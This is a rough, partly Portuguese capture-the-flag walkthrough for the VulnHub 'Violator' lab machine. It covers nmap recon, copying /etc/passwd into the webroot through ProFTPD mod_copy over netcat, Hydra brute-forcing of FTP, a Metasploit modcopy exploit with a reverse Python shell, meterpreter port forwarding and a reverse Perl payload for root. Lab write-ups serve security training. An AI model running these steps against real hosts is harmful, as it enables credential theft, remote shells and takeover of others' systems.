
CTF Walkthrough: Violator
Source: VulnHub - https://www.vulnhub.com/entry/violator-1,153/

Setup Instructions
Set the virtual machine in your NAT lab.

1. Reconnaissance (Recon)
Perform an Nmap scan to identify open ports.

Command Examples:

nmap -sV -v -Pn <host>  
nmap -sC -A -p- -Pn <host>  

Scan Results:

PORT     STATE SERVICE      VERSION  
21/tcp   open  ftp          ProFTPD (modecopy)     
80/tcp   open  http         xxxx

Service Info:  
- Hosts: 
- OS: Linux  
  

2. Enumeration
FTP Enumeration (need user and password, use modecopy) 
http (Has link about album, good idea to create a  wordlist, I used my own scrip to do it.)

Exploiting ProFTPD
ProFTPD allows file copy between directories. We need to find where the passwd is.

File Transfer Example:
Using netcat (nc) to connect to FTP:

nc <host> 21  
220 The Good Tech Inc. FTP Server  
site cpfr /etc/passwd  (this case is locate this path)
350 File or directory exists, ready for destination name  
site cpto /var/www/html/passwd ( You can changed the mame passwd on the path var/www/html/*****)
250 Copy successful  

open it on browser: <host>/passwd
download the file, you can see is user on itm we can used it to create a users wordlist.

To created wordlist I use vi <name of wordlist.txt>

Now we have 2 words list, users and password, Bad baoys, bad boyys, what we gonna do? Hydra

Hydra <-L if you have a wordlist> <-P if you have wordlist> <host> <protocol>
      < -l if you don't have wordlist> <-p if you don't have wordlist> <host-on-line> <protocol if ssh use -t5>
Hydra -L <users.txt> -P <pasWord.txt> <host> ftp

 
Exploiting ProFTPD
ProFTPD allows file copy between directories. Use msfconsole to exploit it.

Steps:
Search for the ProFTPD exploit:

Select and configure the exploit:

use exploit/unix/ftp/proftpd_modcopy_exec  
set RHOST <target IP>  
set RPORT 21  
set payload cmd/unix/reverse_python  
exploit  

After successful exploitation, escalate the shell:
bash

python -c "import pty; pty.spawn('/bin/bash')"  

su -l
id etc.
login with user dg and and password
search for: 
proftpd.config
cat  proftpd.config

netstat -antp
sudo /home/dg/bd/sbin/proftpd

3. Privilege Escalation

ctrl-z put to the background
session
Vamos promover shell, cara ta fraco aqui.
search shell_to__meterpreter
config  set lhost <your> set session 1 and exploit.

sessions
vamos para o portfwd (criador de tunelamento local da maquina)

portfwd add -L 127.0.0.1 -l(L minusculo) 2121 -p 2121 127.0.0.1

ctrl-z
search 133c
options
set rhost 127.0.0.1
set rport
set payload <use o reverse perl>
set lhost <your - ip>
set rport<ur choose 8080>
exploit

id 


root  


Conclusion
Youâ€™ve successfully exploited the target, escalated privileges, and gained root access. Celebrate your achievement and document any additional findings.
